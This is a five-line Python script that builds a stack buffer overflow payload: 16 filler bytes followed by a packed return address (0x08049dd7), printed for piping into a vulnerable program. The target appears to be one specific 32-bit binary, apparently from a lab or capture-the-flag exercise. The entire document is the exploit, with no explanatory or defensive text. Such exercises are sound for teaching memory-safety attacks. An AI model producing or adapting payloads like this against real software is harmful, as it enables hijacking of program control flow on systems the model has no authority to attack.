#!/usr/bin/python3
from struct import pack
ret_addr = pack("<I",0x08049dd7)
attack_str = 16*'A' + ret_addr.decode('utf-8')
print(attack_str)
